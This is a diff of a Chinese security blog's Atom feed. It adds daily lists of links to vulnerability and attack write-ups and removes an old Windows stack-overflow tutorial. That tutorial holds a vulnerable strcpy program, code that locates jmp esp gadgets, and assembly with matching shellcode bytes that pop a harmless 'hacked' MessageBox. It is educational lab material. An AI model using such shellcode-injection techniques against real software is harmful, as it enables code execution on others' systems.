@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kevien.github.io/"/>
-  <updated>2017-08-18T12:05:29.000Z</updated>
+  <updated>2017-08-21T01:00:27.000Z</updated>
   <id>http://kevien.github.io/</id>
   
   <author>
@@ -14,6 +14,48 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>windbg使用</title>
+    <link href="http://kevien.github.io/2017/08/21/windbg%E4%BD%BF%E7%94%A8/"/>
+    <id>http://kevien.github.io/2017/08/21/windbg使用/</id>
+    <published>2017-08-21T01:00:27.000Z</published>
+    <updated>2017-08-21T01:00:27.000Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>20170821安全动态</title>
+    <link href="http://kevien.github.io/2017/08/21/20170821%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
+    <id>http://kevien.github.io/2017/08/21/20170821安全动态/</id>
+    <published>2017-08-21T01:00:15.000Z</published>
+    <updated>2017-08-21T01:00:15.000Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>windbg使用方法</title>
+    <link href="http://kevien.github.io/2017/08/19/windbg%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
+    <id>http://kevien.github.io/2017/08/19/windbg使用方法/</id>
+    <published>2017-08-18T16:00:24.000Z</published>
+    <updated>2017-08-18T16:00:24.000Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>IDA使用方法</title>
@@ -40,17 +82,27 @@
     <link href="http://kevien.github.io/2017/08/18/20170818%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
     <id>http://kevien.github.io/2017/08/18/20170818安全动态/</id>
     <published>2017-08-18T02:24:30.000Z</published>
-    <updated>2017-08-18T10:44:33.000Z</updated>
+    <updated>2017-08-19T09:56:02.000Z</updated>
     
     <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
 <li>漏洞根源在于人——知识深度篇<br><a href="http://www.freebuf.com/vuls/144705.html" target="_blank" rel="external">http://www.freebuf.com/vuls/144705.html</a></li>
+<li>safari本地文件读取漏洞之扩展攻击面<br><a href="http://www.wupco.cn/?p=4134" target="_blank" rel="external">http://www.wupco.cn/?p=4134</a></li>
+<li>Bypass 360主机卫士SQL注入防御<br><a href="http://www.cnblogs.com/xiaozi/p/7275134.html" target="_blank" rel="external">http://www.cnblogs.com/xiaozi/p/7275134.html</a></li>
+<li>node-postgres code execution vulnerability<br><a href="https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability" target="_blank" rel="external">https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability</a></li>
+<li>msdtc后门的实现思路<br><a href="http://www.4hou.com/system/6890.html" target="_blank" rel="external">http://www.4hou.com/system/6890.html</a></li>
+<li>#164224 Urgent: Server side template injection via Smarty template allows for RCE<br><a href="https://hackerone.com/reports/164224" target="_blank" rel="external">https://hackerone.com/reports/164224</a></li>
+<li>Using get_defined_functions To Hidden A PHP Backdoor<br><a href="http://reverse-tcp.xyz/2017/08/17/Using-get_defined_functions-to-hidden-a-php-backdoor/" target="_blank" rel="external">http://reverse-tcp.xyz/2017/08/17/Using-get_defined_functions-to-hidden-a-php-backdoor/</a></li>
+<li>内网发现技巧补充<br><a href="https://mp.weixin.qq.com/s/l-Avt72ajCIo5GdMEwVx7A" target="_blank" rel="external">https://mp.weixin.qq.com/s/l-Avt72ajCIo5GdMEwVx7A</a></li>
 <li>ssh如何方向代理稳定穿透内网<br><a href="http://bobao.360.cn/learning/detail/4234.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4234.html</a></li>
 <li>ZDI 公开了两个 Foxit Reader 的 0Day，分别是 JavaScript API 触发的命令执行（CVE-2017-10951）和文件写漏洞（CVE-2017-10952），由于触发漏洞需要绕过 Safe Reading Mode，所以官方拒绝修复<br><a href="https://www.zerodayinitiative.com/blog/2017/8/17/busting-myths-in-foxit-reader" target="_blank" rel="external">https://www.zerodayinitiative.com/blog/2017/8/17/busting-myths-in-foxit-reader</a></li>
 <li>mod0Umleitung - Windows 上的 DNS 转发服务器，可中途对 DNS 请求进行篡改以及返回自定义的 DNS 解析结果<br><a href="https://modzero.github.io/mod0Umleitung/" target="_blank" rel="external">https://modzero.github.io/mod0Umleitung/</a></li>
 <li>结合 Blind SSRF 漏洞以及 HashiCorp Consul 的错误配置转换成高危的 RCE 漏洞<br><a href="http://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html" target="_blank" rel="external">http://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html</a></li>
 <li>Koadic：COM 命令控制框架（JScript RAT，类似Meterpreter、Empire）<br><a href="http://www.kitploit.com/2017/08/koadic-com-command-control-framework.html" target="_blank" rel="external">http://www.kitploit.com/2017/08/koadic-com-command-control-framework.html</a></li>
 <li>3个步骤实现简单语言解释器（自制简易编程语言）<br><a href="https://francisstokes.wordpress.com/2017/08/16/programming-language-from-scratch/" target="_blank" rel="external">https://francisstokes.wordpress.com/2017/08/16/programming-language-from-scratch/</a></li>
-<li>AndroidManifest.xml文件安全探索<br><http: mp.weixin.qq.com="" s="" c1serfo7aq2pesloras-hq=""><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></http:></li>
+<li>AndroidManifest.xml文件安全探索<br><http: mp.weixin.qq.com="" s="" c1serfo7aq2pesloras-hq=""></http:></li>
+<li>burpsuite插件开发被动式扫描<br><a href="http://www.itwzw.cn/burpsuite-ext-passivescan/" target="_blank" rel="external">http://www.itwzw.cn/burpsuite-ext-passivescan/</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
+<li>如何知道程序的运行时间<br>time xxx  ,time python demo.py</li>
+<li>一次基于zio编写pwn的exp的尝试<br><a href="http://bestwing.me/2016/10/22/%E5%9F%BA%E4%BA%8Ezio%E7%9A%84exp%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/" target="_blank" rel="external">http://bestwing.me/2016/10/22/%E5%9F%BA%E4%BA%8Ezio%E7%9A%84exp%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/</a></li>
 <li>反汇编的利器 IDA 和 Hopper 的基本使用<br><a href="https://niyaoyao.github.io/2017/01/18/Learning-Reverse-From-Today-D3/" target="_blank" rel="external">https://niyaoyao.github.io/2017/01/18/Learning-Reverse-From-Today-D3/</a></li>
 </ul>
 ]]></content>
@@ -70,7 +122,7 @@
     <link href="http://kevien.github.io/2017/08/17/20170817%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
     <id>http://kevien.github.io/2017/08/17/20170817安全动态/</id>
     <published>2017-08-17T01:57:37.000Z</published>
-    <updated>2017-08-17T15:09:07.000Z</updated>
+    <updated>2017-08-19T09:56:02.000Z</updated>
     
     <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
 <li>漏洞发现之细节决定成败<br><a href="http://www.freebuf.com/column/144527.html" target="_blank" rel="external">http://www.freebuf.com/column/144527.html</a></li>
@@ -79,6 +131,7 @@
 <li>graudit - Bash 实现的源代码安全漏洞扫描器，可自定义漏洞的判断规则<br><a href="https://github.com/wireghoul/graudit" target="_blank" rel="external">https://github.com/wireghoul/graudit</a></li>
 <li>在Windows上使用MSFVenom生成PowerShell脚本<br><https: 16="" 2017="" blog.didierstevens.com="" 08="" generating-powershell-scripts-with-msfvenom-on-windows=""></https:></li>
 <li>浅谈简易端口扫描威胁感知系统的设计与实现<br><a href="http://www.freebuf.com/articles/network/144288.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/144288.html</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
+<li>堆栈溢出攻击原理<br><a href="http://blog.csdn.net/aemperor/article/details/47310593" target="_blank" rel="external">http://blog.csdn.net/aemperor/article/details/47310593</a></li>
 <li>Shellcode生成器——msfvenom<br><a href="http://brieflyx.me/2015/linux-tools/msfvenom-intro/" target="_blank" rel="external">http://brieflyx.me/2015/linux-tools/msfvenom-intro/</a></li>
 <li>gdb与peda指令学习学习笔记<br><a href="http://xq.dropsec.xyz/2016/10/30/gdb%E4%B8%8Epeda%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">http://xq.dropsec.xyz/2016/10/30/gdb%E4%B8%8Epeda%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a><br>mac下推荐使用Snitch Network Monitor,进行流量的查看以及拦截，最好拦截掉搜狗输入法和Alipay这样的程序，感觉时刻都在上传你的数据</li>
 </ul>
@@ -99,7 +152,7 @@
     <link href="http://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     <id>http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/</id>
     <published>2017-08-16T10:53:23.000Z</published>
-    <updated>2017-08-18T09:59:34.000Z</updated>
+    <updated>2017-08-19T04:28:36.000Z</updated>
     
     <content type="html"><![CDATA[<h4 id="gdb使用"><a href="#gdb使用" class="headerlink" title="gdb使用"></a>gdb使用</h4><p>gdb GNU Project Debugger<br>在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是<a href="https://github.com/longld/peda" target="_blank" rel="external">peda</a><br>peda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等</p>
 <ul>
@@ -124,8 +177,8 @@
 <li>vmmap – Get virtual mapping address ranges of section(s) in debugged process</li>
 <li>xormem – XOR a memory region with a key</li>
 </ul>
-<p>在gdb中，常用的就是如下的命令<br>run 运行程序 ，会在断点处停下来<br>break或者b  xxx ，下断点<br>next 类似于od中的单步步过<br>step 类似于od中的单步步入</p>
-<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="http://blog.csdn.net/21cnbao/article/details/7385161" target="_blank" rel="external">Linux gdb调试器用法全面解析</a><br><a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="external">一步一步学ROP之linux_x86篇</a><br><a href="https://exploit-exercises.com/" target="_blank" rel="external">linux溢出练习</a><br><a href="http://www.cnblogs.com/pannengzhi/p/5203467.html" target="_blank" rel="external">linux Hook笔记</a><br><a href="http://paper.seebug.org/271/" target="_blank" rel="external">手把手教你栈溢出</a></p>
+<p>在gdb中，常用的就是如下的命令<br>attach  附加某个进程进行调试<br>run 运行程序 ，会在断点处停下来<br>break或者b  xxx ，下断点<br>next 类似于od中的单步步过<br>step 类似于od中的单步步入</p>
+<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="http://blog.csdn.net/21cnbao/article/details/7385161" target="_blank" rel="external">Linux gdb调试器用法全面解析</a><br><a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="external">一步一步学ROP之linux_x86篇</a><br><a href="https://exploit-exercises.com/" target="_blank" rel="external">linux溢出练习</a><br><a href="http://www.cnblogs.com/pannengzhi/p/5203467.html" target="_blank" rel="external">linux Hook笔记</a><br><a href="http://paper.seebug.org/271/" target="_blank" rel="external">手把手教你栈溢出</a><br><a href="https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/DEFCONCTF/babysfirst/r0pbaby" target="_blank" rel="external">DEF CON CTF Quals 2015: r0pbaby</a></p>
 ]]></content>
     
     <summary type="html">
@@ -703,113 +756,6 @@
     <summary type="html">
     
       &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在来分析PE文件结构之前我们先通过file命令来看看文件大致有哪些结构&lt;br&gt;&lt;img sr
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>20170803安全动态</title>
-    <link href="http://kevien.github.io/2017/08/03/20170803%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
-    <id>http://kevien.github.io/2017/08/03/20170803安全动态/</id>
-    <published>2017-08-03T01:31:04.000Z</published>
-    <updated>2017-08-03T05:07:20.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
-<li>2017美国黑帽大会兵工厂工具列表<br><a href="http://www.test404.com/post-1434.html" target="_blank" rel="external">http://www.test404.com/post-1434.html</a></li>
-<li>How to use a single download to remotely steal proprietary files from MacOS<br><a href="https://lab.wallarm.com/hunting-the-files-34caa0c1496" target="_blank" rel="external">https://lab.wallarm.com/hunting-the-files-34caa0c1496</a></li>
-<li>如何利用SSDP协议生成100Gbps的DDoS流量<br><a href="http://bobao.360.cn/learning/detail/4185.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4185.html</a></li>
-<li>堆溢出学习之0CTF 2017 Babyheap<br><a href="http://0x48.pw/2017/08/01/0x36/" target="_blank" rel="external">http://0x48.pw/2017/08/01/0x36/</a></li>
-<li>DotNetNuke 任意代码执行漏洞(CVE-2017-9822)分析预警<br><a href="http://bobao.360.cn/learning/detail/4189.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4189.html</a></li>
-<li>二进制入门-打造Linux shellcode基础篇<br><a href="http://www.freebuf.com/column/142912.html" target="_blank" rel="external">http://www.freebuf.com/column/142912.html</a></li>
-<li>精品漏洞第4弹——层层放大java审计的攻击面<br><a href="https://mp.weixin.qq.com/s/WT1EXEryUGGqHQpSi959xw" target="_blank" rel="external">https://mp.weixin.qq.com/s/WT1EXEryUGGqHQpSi959xw</a></li>
-<li>windows下nginx反向代理https的撸法<br><a href="https://threathunter.org/topic/59813bc16403dadd31449c35" target="_blank" rel="external">https://threathunter.org/topic/59813bc16403dadd31449c35</a></li>
-<li>利用GDB调试ARM代码<br><a href="http://bobao.360.cn/learning/detail/4170.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4170.html</a></li>
-<li>在ReactJS应用程序中利用脚本注入漏洞<br><a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#58;&#x68;&#116;&#x74;&#112;&#115;&#x3a;&#x2f;&#47;&#109;&#x65;&#x64;&#105;&#x75;&#x6d;&#46;&#99;&#x6f;&#x6d;&#47;&#x40;&#x6d;&#x75;&#101;&#x6c;&#108;&#101;&#x72;&#x62;&#101;&#114;&#110;&#100;&#x74;&#x2f;&#101;&#x78;&#112;&#x6c;&#111;&#105;&#116;&#x69;&#x6e;&#x67;&#x2d;&#115;&#99;&#114;&#105;&#x70;&#116;&#x2d;&#105;&#x6e;&#x6a;&#101;&#x63;&#116;&#x69;&#111;&#x6e;&#x2d;&#x66;&#x6c;&#97;&#119;&#x73;&#45;&#105;&#110;&#x2d;&#x72;&#101;&#x61;&#99;&#116;&#106;&#115;&#45;&#x38;&#x38;&#x33;&#102;&#98;&#x31;&#x66;&#101;&#x33;&#54;&#x63;&#x31;">&#x68;&#116;&#x74;&#112;&#115;&#x3a;&#x2f;&#47;&#109;&#x65;&#x64;&#105;&#x75;&#x6d;&#46;&#99;&#x6f;&#x6d;&#47;&#x40;&#x6d;&#x75;&#101;&#x6c;&#108;&#101;&#x72;&#x62;&#101;&#114;&#110;&#100;&#x74;&#x2f;&#101;&#x78;&#112;&#x6c;&#111;&#105;&#116;&#x69;&#x6e;&#x67;&#x2d;&#115;&#99;&#114;&#105;&#x70;&#116;&#x2d;&#105;&#x6e;&#x6a;&#101;&#x63;&#116;&#x69;&#111;&#x6e;&#x2d;&#x66;&#x6c;&#97;&#119;&#x73;&#45;&#105;&#110;&#x2d;&#x72;&#101;&#x61;&#99;&#116;&#106;&#115;&#45;&#x38;&#x38;&#x33;&#102;&#98;&#x31;&#x66;&#101;&#x33;&#54;&#x63;&#x31;</a></li>
-<li>isf:基于Python的工控漏洞利用框架<br><a href="https://github.com/dark-lbp/isf" target="_blank" rel="external">https://github.com/dark-lbp/isf</a></li>
-<li>Sublime Text 的 URL Handler “Subl” 存在一个 Shell 命令执行漏洞<br><a href="https://inopinatus.org/2017/08/02/shell-command-execution-vulnerability-in-subl-a-third-party-sublime-text-url-handler/" target="_blank" rel="external">https://inopinatus.org/2017/08/02/shell-command-execution-vulnerability-in-subl-a-third-party-sublime-text-url-handler/</a></li>
-<li>HUNT Burp Suite扩展 burpsuite 插件<br><a href="https://github.com/bugcrowdlabs/HUNT" target="_blank" rel="external">https://github.com/bugcrowdlabs/HUNT</a></li>
-<li>利用OAuth和o365/Azure进行网络钓鱼<br><a href="http://staaldraad.github.io/pentest/phishing/2017/08/02/o356-phishing-with-oauth/" target="_blank" rel="external">http://staaldraad.github.io/pentest/phishing/2017/08/02/o356-phishing-with-oauth/</a></li>
-<li>Fuzz测试学习资源（书籍、视频、工具、存在漏洞的程序样本等）<br><a href="https://github.com/secfigo/Awesome-Fuzzing/blob/master/README.md" target="_blank" rel="external">https://github.com/secfigo/Awesome-Fuzzing/blob/master/README.md</a></li>
-<li>defcon25-public - PPP 战队将 Defcon 25 决赛中使用的工具与插件公开了<br><a href="https://github.com/pwning/defcon25-public" target="_blank" rel="external">https://github.com/pwning/defcon25-public</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;2017美国黑帽大会兵工厂工具列表&lt;br&gt;&lt;a href=&quot;http://www.test404
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>windows逆向入门</title>
-    <link href="http://kevien.github.io/2017/08/02/windows%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/"/>
-    <id>http://kevien.github.io/2017/08/02/windows逆向入门/</id>
-    <published>2017-08-02T09:15:16.000Z</published>
-    <updated>2017-08-18T12:40:53.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="概念知识点"><a href="#概念知识点" class="headerlink" title="概念知识点"></a>概念知识点</h4><ul>
-<li>在程序执行的过程中，cpu会不断处理数据，而cpu处理的数据通常来自3个地方<br>1.数据在指令中直接给出<br>2.数据在寄存器中<br>3.数据在内存中<h4 id="漏洞利用原理简介"><a href="#漏洞利用原理简介" class="headerlink" title="漏洞利用原理简介"></a>漏洞利用原理简介</h4>本次实例中的windows缓冲区溢出的原理还是比较简单的，首先使用jmp esp覆盖函数的返回地址，然后esp此时存放的正是shellcode的地址，那么shellcode本来是作为数据的结果被当做指令给执行了。感觉其实和sql注入啊，xss啥的都差不多，都是”数据”被当做代码或者指令给执行了 :)<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char buffer[8];</div><div class="line">	LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">	strcpy(buffer,name);</div><div class="line">	printf(&quot;%s\n&quot;,buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>主要是利用strcpy函数的复制，当name的内容大于buffer的大小时候，这个时候会产生异常，Exception code: C0000005 ACCESS_VIOLATION。</p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用栈溢出弹出一个MessageBox的框</p>
-<h4 id="辅助工具代码"><a href="#辅助工具代码" class="headerlink" title="辅助工具代码"></a>辅助工具代码</h4><p>以下代码用于定位user32.dll中的MessageBox以及kernel32.dll中的ExitProcess地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line"></div><div class="line">typedef void (*MYPROC)(LPTSTR);</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	HINSTANCE LibHandle;</div><div class="line">	MYPROC ProcAdd;</div><div class="line">	LibHandle = LoadLibrary(&quot;kernel32&quot;);</div><div class="line">	//LibHandle = LoadLibrary(&quot;user32&quot;);</div><div class="line">	printf(&quot;kernel LibHandle = //x%x\n&quot;,LibHandle);</div><div class="line">	ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;ExitProcess&quot;);</div><div class="line">	//ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;);</div><div class="line">	printf(&quot;system = //x%x\n&quot;,ProcAdd);</div><div class="line"></div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>以下代码用于发现user32.dll(当然其它dll中也存在jmp esp操作码的地址)中jmp esp的操作码的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;stdlib.h&quot;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">		BYTE *ptr;</div><div class="line">		int position;</div><div class="line">		HINSTANCE handle;</div><div class="line">		BOOL done_flag = FALSE;</div><div class="line">		handle = LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">		if(!handle)</div><div class="line">		&#123;</div><div class="line">			printf(&quot;Load dll error&quot;);</div><div class="line">			exit(0);</div><div class="line">		&#125;</div><div class="line">		ptr = (BYTE*)handle;</div><div class="line"></div><div class="line">		for(position = 0; !done_flag; position++ )</div><div class="line">		&#123;</div><div class="line">			try</div><div class="line">			&#123;</div><div class="line">				if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4)</div><div class="line">				&#123;</div><div class="line">					int address = (int)ptr + position;</div><div class="line">					printf(&quot;OPCODE found at 0x%x\n&quot;,address);</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			catch(...)</div><div class="line">			&#123;</div><div class="line">				int address = (int)ptr + position;</div><div class="line">				printf(&quot;END OPCODE found at 0x%x\n&quot;,address);</div><div class="line">				done_flag = true;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h4 id="汇编利用代码实现"><a href="#汇编利用代码实现" class="headerlink" title="汇编利用代码实现"></a>汇编利用代码实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	_asm&#123;</div><div class="line">		sub esp,0x50</div><div class="line">		xor ebx,ebx</div><div class="line">		push ebx</div><div class="line">		push 0x20676e69</div><div class="line">		push 0x6e726157  //push &quot;Warning&quot;</div><div class="line">		mov eax,esp</div><div class="line">		push ebx</div><div class="line">		push 0x20202021    //push &quot;you have been hacked by M0rk!&quot;</div><div class="line">		push 0x6b72304d</div><div class="line">		push 0x20796220</div><div class="line">		push 0x64656b63</div><div class="line">		push 0x6168206e</div><div class="line">		push 0x65656220</div><div class="line">		push 0x65766168</div><div class="line">		push 0x20756f79</div><div class="line">		mov ecx,esp</div><div class="line">			</div><div class="line">		push ebx</div><div class="line">		push eax</div><div class="line">		push ecx</div><div class="line">		push ebx</div><div class="line">		mov eax,0x761aea99</div><div class="line">		call eax</div><div class="line">		push ebx</div><div class="line">		mov eax,0x7700be52</div><div class="line">        call eax</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h4 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h4><p>通过ollydbg或者<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%80%9A%E8%BF%87VisualStudio%E7%94%9F%E6%88%90shellcode/" target="_blank" rel="external">vs</a>查看机器码<br>或者<a href="http://brieflyx.me/2015/linux-tools/msfvenom-intro/" target="_blank" rel="external">msf</a>生成<br>机器码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">83EC 50</div><div class="line">33DB</div><div class="line">53</div><div class="line">68 696E6720</div><div class="line">68 5761726E</div><div class="line">8BC4</div><div class="line">53</div><div class="line">68 21202020</div><div class="line">68 4D30726B</div><div class="line">68 20627920</div><div class="line">68 636B6564</div><div class="line">68 6E206861</div><div class="line">68 20626565</div><div class="line">68 68617665</div><div class="line">68 796F7520</div><div class="line">8BCC</div><div class="line">53</div><div class="line">50</div><div class="line">51</div><div class="line">53</div><div class="line">B8 99EA1A76</div><div class="line">FFD0</div><div class="line">53</div><div class="line">B8 52BE0077</div><div class="line">FFD0</div></pre></td></tr></table></figure></p>
-<p>所以对应的shellcode是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&quot;\x83\xEC\x50&quot;</div><div class="line">  &quot;\x33\xDB&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x68\x69\x6E\x67\x20&quot;</div><div class="line">  &quot;\x68\x57\x61\x72\x6E&quot;</div><div class="line">  &quot;\x8B\xC4&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x68\x21\x20\x20\x20&quot;</div><div class="line">  &quot;\x68\x4D\x30\x72\x6B&quot;</div><div class="line">  &quot;\x68\x20\x62\x79\x20&quot;</div><div class="line">  &quot;\x68\x63\x6B\x65\x64&quot;</div><div class="line">  &quot;\x68\x6E\x20\x68\x61&quot;</div><div class="line">  &quot;\x68\x20\x62\x65\x65&quot;</div><div class="line">  &quot;\x68\x68\x61\x76\x65&quot;</div><div class="line">  &quot;\x68\x79\x6F\x75\x20&quot;</div><div class="line">  &quot;\x8B\xCC&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x50&quot;</div><div class="line">  &quot;\x51&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\xB8\x99\xEA\xF0\x75&quot;</div><div class="line">  &quot;\xFF\xD0&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\xB8\x52\xBE\xC0\x76&quot;</div><div class="line">  &quot;\xFF\xD0&quot;;</div></pre></td></tr></table></figure></p>
